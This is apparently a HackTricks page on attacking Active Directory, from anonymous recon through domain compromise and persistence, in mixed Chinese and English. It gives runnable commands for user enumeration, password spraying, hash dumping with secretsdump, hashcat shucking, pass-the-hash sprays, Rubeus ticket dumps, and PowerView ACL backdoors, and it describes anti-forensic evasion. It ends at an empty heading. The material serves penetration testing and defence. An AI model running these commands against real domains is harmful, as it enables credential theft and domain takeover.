# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** 作为一种基础技术，使 **network administrators** 能够高效地创建和管理网络中的 **domains**、**users** 和 **objects**。它经过精心设计以支持扩展，便于将大量用户组织到可管理的 **groups** 和 **subgroups** 中，同时在不同层级控制 **access rights**。

**Active Directory** 的结构由三个主要层级组成：**domains**、**trees** 和 **forests**。一个 **domain** 包含一组对象，例如 **users** 或 **devices**，它们共享同一个数据库。**Trees** 是由这些通过共享结构连接起来的 domain 组成的组，而一个 **forest** 则表示多个 tree 的集合，它们通过 **trust relationships** 相互连接，构成组织结构的最上层。可以在这些层级中的每一级指定特定的 **access** 和 **communication rights**。

**Active Directory** 中的关键概念包括：

1. **Directory** – 存放与 Active Directory 对象相关的所有信息。
2. **Object** – 指目录中的实体，包括 **users**、**groups** 或 **shared folders**。
3. **Domain** – 作为目录对象的容器，多个 domain 可以共存于一个 **forest** 中，每个都维护自己的对象集合。
4. **Tree** – 共享同一个根 domain 的 domains 组。
5. **Forest** – Active Directory 组织结构的顶层，由多个 tree 组成，它们之间存在 **trust relationships**。

**Active Directory Domain Services (AD DS)** 包含一系列对网络中的集中管理与通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中存储数据并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 负责安全 **digital certificates** 的创建、分发和管理。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持目录启用的应用程序。
4. **Directory Federation Services** – 提供 **single-sign-on** 能力，在单次会话中对多个 web 应用程序的用户进行身份验证。
5. **Rights Management** – 通过规范其未经授权的分发和使用，帮助保护版权材料。
6. **DNS Service** – 对 **domain names** 的解析至关重要。

如需更详细的说明，请查看：[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

要学习如何 **attack an AD**，你需要真正很好地 **understand** **Kerberos authentication process**。\
[**如果你还不知道它是如何工作的，请阅读此页。**](kerberos-authentication.md)

## Cheat Sheet

你可以查看 [https://wadcoms.github.io/](https://wadcoms.github.io) 来快速了解有哪些命令可以用来枚举/利用 AD。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你只是可以访问一个 AD 环境，但没有任何 credentials/sessions，你可以：

- **Pentest the network:**
- 扫描网络，找到机器和开放端口，并尝试 **exploit vulnerabilities** 或从中 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可能会提供域中关键服务器的信息，例如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取有关如何执行此操作的更多信息。
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 更详细的 SMB server 枚举指南可以在这里找到：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 更详细的 LDAP 枚举指南可以在这里找到（请 **特别注意 anonymous access**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集 credentials
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问 host
- 通过 [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 暴露的方式收集 credentials
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从域环境内部以及公开可获得的文档、社交媒体、services 中提取用户名/姓名（主要是 web）。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/))。最常见的规则有：_NameSurname_、_Name.Surname_、_NamSur_（各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个 _random letters and 3 random numbers_（abc123）。
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求一个 **invalid username** 时，server 会返回 **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_，这使我们能够判断该 username 无效。**Valid usernames** 会返回 **TGT in a AS-REP** 响应，或者错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该 user 需要进行 pre-authentication。
- **No Authentication against MS-NRPC**: 在 domain controllers 的 MS-NRPC (Netlogon) interface 上使用 auth-level = 1 (No authentication)。该方法会在绑定 MS-NRPC interface 后调用 `DsrGetDcNameEx2` 函数，在没有任何 credentials 的情况下检查 user 或 computer 是否存在。`NauthNRPC`(https://github.com/sud0Ru/NauthNRPC) tool 实现了这种枚举方式。相关研究可见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现了这些服务器之一，你也可以对其执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 以及这个仓库 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 中找到用户名列表。
>
> 但是，你应该已经从之前应该执行的 recon 步骤中获得了在公司工作的**人员姓名**。有了名字和姓氏，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成可能有效的 usernames。

### Knowing one or several usernames

Ok, 所以你已经知道你有一个有效的 username，但没有 passwords... 那就尝试：

- [**ASREPRoast**](asreproast.md): 如果某个 user **没有** 属性 _DONT_REQ_PREAUTH_，你可以为该 user **请求一个 AS_REP message**，其中会包含一些由该 user 的 password 的派生结果加密的数据。
- [**Password Spraying**](password-spraying.md): 让我们尝试针对每个已发现的 user 使用最**常见的 passwords**，也许某个 user 正在使用弱 password（注意 password policy!）。
- 注意，你也可以对 **OWA servers** 进行 spray，以尝试访问用户的 mail servers。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你也许能够通过 **poisoning** 网络中的某些协议来获取一些挑战用的 **hashes**，以便 crack：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经成功枚举了 active directory，你将拥有**更多 emails 以及对网络更好的理解**。你也许可以强制进行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来获取对 AD env 的访问权限。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 来按 engagement 保持 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下生成按 protocol 分开的 SQLite DBs（smb/mssql/winrm/ldap/etc）。可通过 `proto smb|mssql|winrm` 切换视图，并用 `creds` 列出收集到的 secrets。完成后手动清理敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 进行快速 subnet discovery，会显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的成员通常 **relay-prone**，而 DCs 往往需要 signing。
- 直接根据 NetExec 输出在 `/etc/hosts` 中生成 **hostnames** 以便更容易定位目标：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay 到 DC 被 signing 阻止** 时，仍要探测 **LDAP** 状态：`netexec ldap <dc>` 会标出 `(signing:None)` / 弱 channel binding。一个 SMB signing required 但 LDAP signing disabled 的 DC，仍然是可用于 **relay-to-LDAP** 的目标，可被滥用于 **SPN-less RBCD** 等攻击。

### 客户端侧打印机凭据泄露 → 批量域凭据验证

- Printer/web UI 有时会在 HTML 中 **嵌入被掩码的 admin passwords**。查看源码/devtools 可能会泄露明文（例如 `<input value="<password>">`），从而通过 Basic-auth 访问扫描/打印仓库。
- 获取到的打印任务可能包含带有每个用户 password 的 **plaintext onboarding docs**。测试时要保持配对一致：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use **powershell** for recon which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD 的 DNS records**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已经成功枚举了 active directory，你会得到**更多邮件**以及对网络**更好的理解**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**。**

### Looks for Creds in Computer Shares | SMB Shares

现在你已经有了一些基本凭证，你应该检查是否能在 AD 内**找到**任何**有趣的共享文件**。你可以手动做这件事，但这是一项非常无聊的重复任务（如果你发现有成百上千份文档要检查，就更是如此）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你可以**访问其他 PC 或共享**，你可以**放置文件**（比如 SCF 文件），如果它们在某种情况下被访问，就会**触发对你发起的 NTLM authentication**，这样你就可以**窃取** **NTLM challenge** 并进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

这个漏洞允许任何经过认证的用户**控制 domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 中利用特权凭证/session 进行提权

**对于以下技巧，普通域用户是不够的，你需要一些特殊的权限/凭证来执行这些攻击。**

### Hash extraction

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[本地提权](../windows-local-privilege-escalation/index.html) 成功**控制了一些本地管理员**账户。\
然后，就是把内存中和本地的所有 hash dump 出来的时候了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你有了某个用户的 hash**，你就可以用它来**冒充**该用户。\
你需要使用某个**工具**，通过这个 hash 执行 **NTLM authentication**，**或者**你可以创建一个新的 **sessionlogon**，并将这个 hash **注入**到 **LSASS** 中，这样当执行任何 **NTLM authentication** 时，都会使用那个 hash。最后一种方式就是 mimikatz 的做法。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

这个攻击的目标是**使用用户的 NTLM hash 来请求 Kerberos tickets**，作为对常见的通过 NTLM 协议进行 Pass The Hash 的替代方案。因此，在**禁用了 NTLM 协议**且只**允许 Kerberos** 作为认证协议的网络中，这会特别**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者不是窃取用户的密码或 hash 值，而是**窃取用户的 authentication ticket**。随后，这个被盗的 ticket 会被用来**冒充用户**，从而在网络内获取对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你有**本地管理员**的 **hash** 或 **password**，你应该尝试用它**在本地登录**到其他 **PCs**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这相当 **noisy**，而且 **LAPS** 可以 **mitigate** 它。

### MSSQL Abuse & Trusted Links

如果一个用户有权限 **access MSSQL instances**，他可能可以用它在 MSSQL 主机上 **execute commands**（如果以 SA 运行），**steal** NetNTLM **hash**，甚至执行 **relay** **attack**。\
另外，如果某个 MSSQL 实例被另一个 MSSQL 实例 **trusted**（database link）。如果用户对这个受信任数据库有权限，他就能够 **use the trust relationship to execute queries also in the other instance**。这些信任关系可以被链式连接，在某个时刻，用户可能会找到一个配置错误的数据库，在那里他可以执行命令。\
**数据库之间的链接甚至在 forest trusts 之间也能工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方 inventory 和 deployment 套件通常会暴露通往凭据和 code execution 的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你找到任何带有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 的 Computer object，并且你在该 computer 上拥有 domain privileges，你就能够从每个登录到该计算机的用户的内存中转储 TGT。\
因此，如果 **Domain Admin logs onto the computer**，你就能够转储他的 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以 **automatically compromise a Print Server**（希望它会是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果一个用户或计算机被允许进行 "Constrained Delegation"，它就能够 **impersonate any user to access some services in a computer**。\
然后，如果你 **compromise the hash** of this user/computer，你就能够 **impersonate any user**（甚至 domain admins）去访问某些服务。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程计算机的 Active Directory object 上拥有 **WRITE** 权限，可以借此获得具有 **elevated privileges** 的 code execution：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻陷的用户可能对某些 domain objects 拥有一些 **interesting privileges**，这可能让你 **move** laterally/**escalate** privileges。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

发现 domain 内有 **Spool service listening** 可以被 **abused** 来 **acquire new credentials** 并 **escalate privileges**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果 **other users** **access** 了 **compromised** 机器，就有可能 **gather credentials from memory**，甚至向他们的进程中 **inject beacons** 来冒充他们。\
通常用户会通过 RDP 访问系统，所以这里有一些针对第三方 RDP session 的攻击方法：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一套用于管理域加入计算机上 **local Administrator password** 的系统，确保它是 **randomized**、唯一并且经常 **changed**。这些密码存储在 Active Directory 中，并且通过 ACLs 仅授权给特定用户访问。只要有足够权限访问这些密码，就可以 pivot 到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

从被攻陷的机器上 **Gathering certificates** 可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了 **vulnerable templates**，就有可能利用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin**，甚至更好的是 **Enterprise Admin** 权限，你就可以 **dump** **domain database**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md)。

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前面讨论的一些技术也可以用于持久化。\
例如，你可以：

- 让用户容易受到 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 让用户容易受到 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 会通过使用 **NTLM hash**（例如，**PC account** 的 hash）为特定服务创建一个 **legitimate Ticket Granting Service (TGS) ticket**。这种方法用于 **access the service privileges**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 是指攻击者在 Active Directory (AD) 环境中获取 **krbtgt account 的 NTLM hash**。这个账户很特殊，因为它用于签名所有 **Ticket Granting Tickets (TGTs)**，而这些票据对于在 AD 网络内认证至关重要。

一旦攻击者获得这个 hash，他就可以为任意账户创建 **TGTs**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据类似 golden tickets，但其伪造方式可以 **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个账户的 certificates，或者能够请求它们**，是让自己在该用户账户中持久化的一个非常好的方式（即使他更改了密码）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用 certificates 也可以在域内以高权限持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** object 通过在这些组上应用标准 **Access Control List (ACL)** 来确保 **privileged groups**（如 Domain Admins 和 Enterprise Admins）的安全，从而防止未授权更改。不过，这个功能也可以被利用；如果攻击者修改 AdminSDHolder 的 ACL，使普通用户拥有完全访问权限，那么该用户就会获得对所有特权组的广泛控制。这个本用于保护的安全机制因此可能适得其反，除非被密切监控，否则会导致不应有的访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 内，都存在一个 **local administrator** 账户。通过在这样的机器上获取 admin 权限，可以使用 **mimikatz** 提取本地 Administrator hash。之后，需要修改注册表以 **enable the use of this password**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以向某些特定 domain objects 上的某个 **user** **give** 一些 **special permissions**，这将使该用户将来能够 **escalate privileges**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于 **store** 一个 **object** 对另一个 **object** 所拥有的 **permissions**。如果你只需对某个对象的 **security descriptor** 做一点小改动，就可以在不成为特权组成员的情况下，获得该对象上非常有价值的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` 辅助类来创建短生命周期的 principals/GPOs/DNS records，使用 `entryTTL`/`msDS-Entry-Time-To-Die`；它们会在没有 tombstones 的情况下自我删除，抹去 LDAP 证据，同时留下孤立 SID、损坏的 `gPLink` 引用，或缓存的 DNS responses（例如，AdminSDHolder ACE 污染或恶意 `gPCFileSysPath`/AD-integrated DNS redirects）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS**，建立一个 **universal password**，从而允许访问所有域账户。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

